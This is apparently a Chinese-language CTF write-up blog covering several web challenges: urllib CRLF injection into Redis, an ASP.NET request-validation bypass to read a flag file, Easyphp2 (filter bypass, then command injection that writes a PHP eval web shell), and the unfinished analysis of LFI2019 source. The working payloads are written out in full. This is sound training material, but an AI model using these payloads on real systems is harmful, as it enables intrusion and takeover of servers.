<p><img src="https://img.npfs06.top/20210328181734.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210328181758.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><a href="https://bugs.python.org/issue30458" target="_blank">CVE-2019-9947</a></p>
<p><img src="https://img.npfs06.top/20210328182806.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容</p>
<p>也就是说，我们就可以通过%0d%0a去构造一个新的HTTP请求。</p>
<p>思路：向Redis写数据，改掉admin的密码。Redis改数据用set指令。然后换行用%0d%0a。所以，Payload：<code>http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo</code> </p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">GET</span> / HTTP/<span class="number">1.1</span></span><br><span class="line">Accept-<span class="keyword">Encoding</span>: <span class="keyword">identity</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">set</span> <span class="keyword">admin</span> <span class="keyword">admin</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">Connection</span>: <span class="keyword">close</span></span><br><span class="line"><span class="keyword">User</span>-Agent: Python-urllib/<span class="number">2.7</span></span><br></pre></td></tr></table></figure>


<p>然后我们登录/login，输入admin就可以了。不过动作要快，因为admin密码会定时修改。</p>
<h2 id="Windows-HITCON-2019-Buggy-Net"><a href="#Windows-HITCON-2019-Buggy-Net" class="headerlink" title="[Windows][HITCON 2019]Buggy_Net"></a>[Windows][HITCON 2019]Buggy_Net</h2><p>hint:flag在c:/FLAG.txt</p>
<p>给了源码，主要部分如下</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">bool</span> isBad = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Request.Form[<span class="string">&quot;filename&quot;</span>] != <span class="literal">null</span> ) &#123;</span><br><span class="line">        isBad = Request.Form[<span class="string">&quot;filename&quot;</span>].Contains(<span class="string">&quot;..&quot;</span>) == <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception ex) &#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!isBad) &#123;</span><br><span class="line">        Response.Write(System.IO.File.ReadAllText(<span class="string">@&quot;C:\inetpub\wwwroot\&quot;</span> + Request.Form[<span class="string">&quot;filename&quot;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception ex) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先<code>isBad</code>为<code>false</code>，如果POST的文件名包含<code>..</code>的话，<code>isBad</code>就会为<code>true</code>，就读不了文件了。</p>
<p>所以这里要bypass<code>..</code>去读取文件</p>
<p>So lets ask Google if there are any known bugs in ASP.NET …</p>
<p>The basic idea of that vulnerability is that, for POST requests, request validation prevents “dangerous content” (e.g. HTML tags or similar, such as <code>&lt;x</code>) in <em>POST form fields</em> by terminating the whole application. However, the same content in query-string fields will pass initial request validation and will “only” raise an exception on first access of <code>Request.QueryString[...]</code> (since that field is populated on first access?)</p>
<p>Similarly, for GET requests, request validation prevents “dangerous content” (e.g. HTML tags or similar, such as <code>&lt;x</code>) in <em>GET query-string fields</em> by terminating the whole application. However, the same content in form fields (i.e. in a request body encoded as <code>application/x-www-form-urlencoded</code>) will pass initial request validation and will “only” raise an exception on first access of <code>Request.Form[...]</code> (again, since that field is populated on first access?)</p>
<p>Nevertheless, query-string fields in a POST request are accessbile through <code>Request.QueryString[...]</code> and form fields submitted in the <em>request body</em> of a <strong>GET</strong> request (with content-type <code>application/x-www-form-urlencoded</code>) are accessible through <code>Request.Form[...]</code>.</p>
<p>Hence, we should be able to successfully submit the form by the sending a <strong>GET</strong> request without any query-string field but with the filename field in the <strong>request body</strong>. Further, by also including another form field in the request body that will trigger that “late” request validation bug (or is it a feature if Microsoft declared to won’t fix? 😜), e.g. a simple <code>&amp;o=&lt;x</code>, we should be able to trigger an exception on first access of <code>Request.Form[&quot;filename&quot;]</code> … and this is exactly what we need to escape from the first try-catch-block before changing <code>isBad</code>.</p>
<p>payload:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>52.197.162.211</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>42</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://52.197.162.211/</span><br><span class="line"></span><br><span class="line">filename=%2E%2E%5C%2E%2E%5CFLAG.txt&amp;o=%3Cx</span><br></pre></td></tr></table></figure>




<h2 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2><p>伪协议文件读取，有waf，通过二次编码绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;b&#x27;</span>; <span class="comment">#构造r的二次编码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii1</span> = <span class="number">0</span>; <span class="variable">$ascii1</span> &lt; <span class="number">256</span>; <span class="variable">$ascii1</span>++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$ascii2</span> = <span class="number">0</span>; <span class="variable">$ascii2</span> &lt; <span class="number">256</span>; <span class="variable">$ascii2</span>++) &#123;</span><br><span class="line">		<span class="variable">$aaa</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii1</span>.<span class="string">&#x27;%&#x27;</span>.<span class="variable">$ascii2</span>;</span><br><span class="line">		<span class="keyword">if</span>(urldecode(urldecode(<span class="variable">$aaa</span>)) == <span class="variable">$char</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$char</span>.<span class="string">&#x27;: &#x27;</span>.<span class="variable">$aaa</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//b: %6%32</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>?file=php://filter/read=convert.%62ase64-encode/resource=GWHT.php</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;max_execution_time&#39;, 5);</span><br><span class="line"></span><br><span class="line">if ($_COOKIE[&#39;pass&#39;] !&#x3D;&#x3D; getenv(&#39;PASS&#39;)) &#123;</span><br><span class="line">    setcookie(&#39;pass&#39;, &#39;PASS&#39;);</span><br><span class="line">    die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;count&quot;])) &#123;</span><br><span class="line">    $count &#x3D; $_GET[&quot;count&quot;];</span><br><span class="line">    if(preg_match(&#39;&#x2F;;|base64|rot13|base32|base16|&lt;\?php|#&#x2F;i&#39;, $count))&#123;</span><br><span class="line">    	die(&#39;hacker!&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>通过robots.txt知道还有个check.php页面，同理读源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>抓个包看下</p>
<p><img src="https://img.npfs06.top/20210330194306.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>我们把这里的PASS改为GWHT</p>
<p>接下来就是命令执行exec(‘printf ‘’ . $count . ‘’ | wc -c’)，exec命令无回显，可以直接写入shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;|echo+&quot;&lt;%3f%3d+eval(\$_POST[&#x27;</span>shell<span class="string">&#x27;])%3f&gt;&quot;+&gt;+a.php&#x27;</span></span><br><span class="line">  </span><br><span class="line"> <span class="comment">//exec(&#x27;printf \&#x27;&#x27;&#x27;|echo+&quot;&lt;%3f%3d+eval(\$_POST[&#x27;shell&#x27;])%3f&gt;&quot;+&gt;+a.php&#x27;&#x27;\&#x27; | wc -c&#x27;) </span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210330195657.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>蚁剑链接</p>
<p><img src="https://img.npfs06.top/20210330195725.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>看了wp发现预期解是</p>
<p>发现了flag的所在地，但是没有权限，需要用GWHT或者root用户的权限才行。根目录下有一个<code>GWHT</code> 目录，</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@b3beb2760c83</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>ls /GWHT</span><br><span class="line">ls /GWHT</span><br><span class="line">README</span><br><span class="line">avenged</span><br><span class="line">dream</span><br><span class="line">findaas</span><br><span class="line">led</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
<p>在README中得到hash</p>
<figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line"><span class="number">877862561</span>ba0162ce610dd8bf90868ad414f0ec6.</span><br></pre></td></tr></table></figure>
<p>解得为：GWHTCTF</p>
<p>直接就能看flag了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@b3beb2760c83:&#x2F;var&#x2F;www&#x2F;html$ su - GWHT</span><br><span class="line">su - GWHT</span><br><span class="line">Password: GWHTCTF</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>


<h2 id="Windows-LFI2019"><a href="#Windows-LFI2019" class="headerlink" title="[Windows]LFI2019"></a>[Windows]LFI2019</h2><p>找不到源码，直接上github找的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">        Developed by stypr.</span><br><span class="line">        Made in 2018, Releasing in 2019!</span><br><span class="line">    *&#x2F;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Baka flag-sama and seed-chan! &#x2F;&#x2F;</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&quot;display_errors&quot;,&quot;off&quot;);</span><br><span class="line">    @require(&#39;flag.php&#39;);</span><br><span class="line">    $seed &#x3D; md5(rand(PHP_INT_MIN,PHP_INT_MAX));</span><br><span class="line"></span><br><span class="line">    if($flag &#x3D;&#x3D;&#x3D; $_GET[&#39;trigger&#39;])&#123;</span><br><span class="line">        die(hash(&quot;sha256&quot;, $seed . $flag));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sessions are never used but we add that &#x2F;&#x2F;</span><br><span class="line">    ini_set(&#39;session.cookie_httponly&#39;, 1); @phpinfo();</span><br><span class="line">    ini_set(&#39;session.cookie_secure&#39;, 1); @phpinfo();</span><br><span class="line">    ini_set(&#39;session.use_only_cookies&#39;,1); @phpinfo();</span><br><span class="line">    ini_set(&#39;session.gc_probability&#39;, 1); @phpinfo();</span><br><span class="line">    &#x2F;&#x2F; but really, you can&#39;t really do something with sessions. &#x2F;&#x2F;</span><br><span class="line">    session_save_path(&#39;.&#x2F;sess&#x2F;&#39;);</span><br><span class="line">    session_name(&quot;lfi2019&quot;);</span><br><span class="line">    session_start();</span><br><span class="line">    session_destroy();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Flush directory for security purposes &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; Referenced it from StackOverflow: https:&#x2F;&#x2F;bit.ly&#x2F;2MxvxXE &#x2F;&#x2F;</span><br><span class="line">    function rrmdir($dir, $depth&#x3D;0)&#123; </span><br><span class="line">        if (is_dir($dir))&#123;</span><br><span class="line">            $objects &#x3D; scandir($dir); </span><br><span class="line">            foreach ($objects as $object)&#123; </span><br><span class="line">                if ($object !&#x3D; &quot;.&quot; &amp;&amp; $object !&#x3D; &quot;..&quot;)&#123; </span><br><span class="line">                    if(is_dir($dir.&quot;&#x2F;&quot;.$object))</span><br><span class="line">                        rrmdir($dir.&quot;&#x2F;&quot;.$object, $depth + 1);</span><br><span class="line">                    else</span><br><span class="line">                        unlink($dir.&quot;&#x2F;&quot;.$object); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if($depth !&#x3D; 0) rmdir($dir); </span><br><span class="line">    &#125;</span><br><span class="line">    function countdir($dir)&#123;</span><br><span class="line">        if (is_dir($dir))&#123;</span><br><span class="line">            $objects &#x3D; scandir($dir);</span><br><span class="line">            foreach ($objects as $object)&#123; </span><br><span class="line">                if ($object !&#x3D; &quot;.&quot; &amp;&amp; $object !&#x3D; &quot;..&quot;)&#123; </span><br><span class="line">                    $count +&#x3D; 1;</span><br><span class="line">                    if(is_dir($dir.&quot;&#x2F;&quot;.$object))</span><br><span class="line">                        $count +&#x3D; countdir($dir.&quot;&#x2F;&quot;.$object);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return $count;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(countdir(&quot;.&#x2F;files&quot;));</span><br><span class="line">    if(countdir(&quot;.&#x2F;files&#x2F;&quot;) &gt;&#x3D; 100) @rrmdir(&quot;.&#x2F;files&#x2F;&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Here, kawaii path-san for you! &#x2F;&#x2F;</span><br><span class="line">    function path_sanitizer($dir, $harden&#x3D;false)&#123;</span><br><span class="line">        $dir &#x3D; (string)$dir;</span><br><span class="line">        $dir_len &#x3D; strlen($dir);</span><br><span class="line">        &#x2F;&#x2F; Deny LFI&#x2F;RFI&#x2F;XSS &#x2F;&#x2F;</span><br><span class="line">        $filter &#x3D; [&#39;.&#39;, &#39;.&#x2F;&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;];</span><br><span class="line">        foreach($filter as $f)&#123;</span><br><span class="line">            if(stripos($dir, $f) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; Deny SSRF and all possible weird bypasses &#x2F;&#x2F;</span><br><span class="line">        $stream &#x3D; stream_get_wrappers();</span><br><span class="line">        $stream &#x3D; array_merge($stream, stream_get_transports());</span><br><span class="line">        $stream &#x3D; array_merge($stream, stream_get_filters());</span><br><span class="line">        foreach($stream as $f)&#123;</span><br><span class="line">            $f_len &#x3D; strlen($f);</span><br><span class="line">            if(substr($dir, 0, $f_len) &#x3D;&#x3D;&#x3D; $f)&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; Deny length &#x2F;&#x2F;</span><br><span class="line">        if($dir_len &gt;&#x3D; 128)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">		&#x2F;&#x2F; Easy level hardening &#x2F;&#x2F;</span><br><span class="line">		if($harden)&#123;</span><br><span class="line">			$harden_filter &#x3D; [&quot;&#x2F;&quot;, &quot;\\&quot;];</span><br><span class="line">			foreach($harden_filter as $f)&#123;</span><br><span class="line">				$dir &#x3D; str_replace($f, &quot;&quot;, $dir);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Sanitize feature is available starting from the medium level &#x2F;&#x2F;</span><br><span class="line">        return $dir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; The new kakkoii code-san is re-implemented. &#x2F;&#x2F;</span><br><span class="line">    function code_sanitizer($code)&#123;</span><br><span class="line">        &#x2F;&#x2F; Computer-chan, please don&#39;t speak english. Speak something else! &#x2F;&#x2F;</span><br><span class="line">        $code &#x3D; preg_replace(&quot;&#x2F;[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#39;\&quot;\&#x3D;\(\)\[\]\;]&#x2F;u&quot;, &quot;*Nope*&quot;, (string)$code);</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Errors are intended and straightforward. Please do not ask questions. &#x2F;&#x2F;</span><br><span class="line">    class Get &#123;</span><br><span class="line">        protected function nanahira()&#123;</span><br><span class="line">            &#x2F;&#x2F; senpai notice me &#x2F;&#x2F;</span><br><span class="line">            function exploit($data)&#123;</span><br><span class="line">                $exploit &#x3D; new System();</span><br><span class="line">            &#125;</span><br><span class="line">            $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">        private $filename;</span><br><span class="line">        function __construct($filename)&#123;</span><br><span class="line">            $this-&gt;filename &#x3D; path_sanitizer($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        function get()&#123;</span><br><span class="line">            if($this-&gt;filename &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; wtf???? &#x2F;&#x2F;</span><br><span class="line">            if(!@file_exists($this-&gt;filename))&#123;</span><br><span class="line">                &#x2F;&#x2F; index files are *completely* disabled. &#x2F;&#x2F;</span><br><span class="line">                if(stripos($this-&gt;filename, &quot;index&quot;) !&#x3D;&#x3D; false)&#123;</span><br><span class="line">                    return [&quot;msg&quot; &#x3D;&gt; &quot;you cannot include index files!&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F; hardened sanitizer spawned. thus we sense ambiguity &#x2F;&#x2F;</span><br><span class="line">                $read_file &#x3D; &quot;.&#x2F;files&#x2F;&quot; . $this-&gt;filename;</span><br><span class="line">                $read_file_with_hardened_filter &#x3D; &quot;.&#x2F;files&#x2F;&quot; . path_sanitizer($this-&gt;filename, true);</span><br><span class="line"></span><br><span class="line">                if($read_file &#x3D;&#x3D;&#x3D; $read_file_with_hardened_filter ||</span><br><span class="line">                    @file_get_contents($read_file) &#x3D;&#x3D;&#x3D; @file_get_contents($read_file_with_hardened_filter))&#123;</span><br><span class="line">                    return [&quot;msg&quot; &#x3D;&gt; &quot;request blocked&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; .. and finally, include *un*exploitable file is included. &#x2F;&#x2F;</span><br><span class="line">                @include(&quot;.&#x2F;files&#x2F;&quot; . $this-&gt;filename);</span><br><span class="line">                return [&quot;type&quot; &#x3D;&gt; &quot;success&quot;];</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;invalid filename (wtf)&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Put &#123;</span><br><span class="line">        protected function nanahira()&#123;</span><br><span class="line">            &#x2F;&#x2F; senpai notice me &#x2F;&#x2F;</span><br><span class="line">            function exploit($data)&#123;</span><br><span class="line">                $exploit &#x3D; new System();</span><br><span class="line">            &#125;</span><br><span class="line">            $_GET[&#39;trigger&#39;] &amp;&amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[&#39;leak&#39;][&#39;leak&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">        private $filename;</span><br><span class="line">        private $content;</span><br><span class="line">        private $dir &#x3D; &quot;.&#x2F;files&#x2F;&quot;;</span><br><span class="line">        function __construct($filename, $data)&#123;</span><br><span class="line">            global $seed;</span><br><span class="line">            if((string)$filename &#x3D;&#x3D;&#x3D; (string)@path_sanitizer($data[&#39;filename&#39;]))&#123;</span><br><span class="line">                $this-&gt;filename &#x3D; (string)$filename;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;filename &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;content &#x3D; (string)@code_sanitizer($data[&#39;content&#39;]);</span><br><span class="line">        &#125;</span><br><span class="line">        function put()&#123;</span><br><span class="line">            &#x2F;&#x2F; just another typical file insertion &#x2F;&#x2F;</span><br><span class="line">            if($this-&gt;filename &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;blocked by path sanitizer&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; check if file exists &#x2F;&#x2F;</span><br><span class="line">            if(file_exists($this-&gt;dir . $this-&gt;filename))&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;file exists&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents($this-&gt;dir . $this-&gt;filename, $this-&gt;content);</span><br><span class="line">            &#x2F;&#x2F; just check if file is written. hopefully. &#x2F;&#x2F;</span><br><span class="line">            if(@file_get_contents($this-&gt;dir . $this-&gt;filename) &#x3D;&#x3D; &quot;&quot;)&#123;</span><br><span class="line">                return [&quot;msg&quot; &#x3D;&gt; &quot;file not written.&quot;, &quot;type&quot; &#x3D;&gt; &quot;error&quot;];</span><br><span class="line">            &#125;</span><br><span class="line">            return [&quot;type&quot; &#x3D;&gt; &quot;success&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Triggering this is nearly impossible &#x2F;&#x2F;</span><br><span class="line">    class System &#123;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            global $seed;</span><br><span class="line">            &#x2F;&#x2F; ain&#39;t Argon2, ain&#39;t pbkdf2. what could go wrong?</span><br><span class="line">            $flag &#x3D; hash(&#39;sha256&#39;, $seed);</span><br><span class="line">            if($_GET[$flag])&#123;</span><br><span class="line">                @system($_GET[$flag]);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                @unserialize($_SESSION[$flag]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Don&#39;t call me a savage... I gave everything you need &#x2F;&#x2F;</span><br><span class="line">    if($_SERVER[&#39;QUERY_STRING&#39;] &#x3D;&#x3D;&#x3D; &quot;show-me-the-hint&quot;)&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; XSS protection and hints ^-^ &#x2F;&#x2F;</span><br><span class="line">    header(&#39;X-Hint: &#x2F;index.php?show-me-the-hint&#39;);</span><br><span class="line">    header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">    header(&#39;X-XSS-Protection: 1; mode&#x3D;block;&#39;);</span><br><span class="line">    header(&#39;X-Content-Type-Options: nosniff&#39;);</span><br><span class="line">    header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);</span><br><span class="line">    header(&#39;Cache-Control: no-store, no-cache, must-revalidate, max-age&#x3D;0&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-$&#123;seed&#125;&#39; &#39;unsafe-eval&#39;;&quot; .</span><br><span class="line">    &#x2F;&#x2F;&quot;font-src &#39;nonce-$&#123;seed&#125;&#39; fonts.gstatic.com; style-src &#39;nonce-$&#123;seed&#125;&#39; fonts.googleapis.com;&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Hello, JSON! &#x2F;&#x2F;</span><br><span class="line">    $parsed_url &#x3D; explode(&quot;&amp;&quot;, $_SERVER[&#39;QUERY_STRING&#39;]);</span><br><span class="line">    if(count($parsed_url) &gt;&#x3D; 2)&#123;</span><br><span class="line">        header(&quot;Content-Type:text&#x2F;json&quot;);</span><br><span class="line">        switch($parsed_url[0])&#123;</span><br><span class="line">            case &quot;get&quot;:</span><br><span class="line">                $get &#x3D; new Get($parsed_url[1]);</span><br><span class="line">                $data &#x3D; $get-&gt;get();</span><br><span class="line">                break;</span><br><span class="line">            case &quot;put&quot;:</span><br><span class="line">                $put &#x3D; new Put($parsed_url[1], $_POST);</span><br><span class="line">                $data &#x3D; $put-&gt;put();</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                $data &#x3D; [&quot;msg&quot; &#x3D;&gt; &quot;Invalid data.&quot;];</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">        die(json_encode($data));</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码主要分为三个部分</p>
<p><strong>过滤函数：</strong></p>
<p><img src="https://img.npfs06.top/20210331191241.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>对文件名和文件内容的waf</p>
<p><strong>PUT类：</strong></p>
<p><img src="https://img.npfs06.top/20210331190910.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>put类可以进行写文件操作，文件名可控但是要经过path_sanitizer过滤，然后拼接写在files目录下，path_sanitizer函数会过滤</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$filter</span> = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;.\\&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>写的内容也可控，但是要过这个正则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#x27;\&quot;\=\(\)\[\]\;]/u&quot;</span>, <span class="string">&quot;*Nope*&quot;</span>, (<span class="keyword">string</span>)</span><br></pre></td></tr></table></figure>
<p><strong>GET类</strong></p>
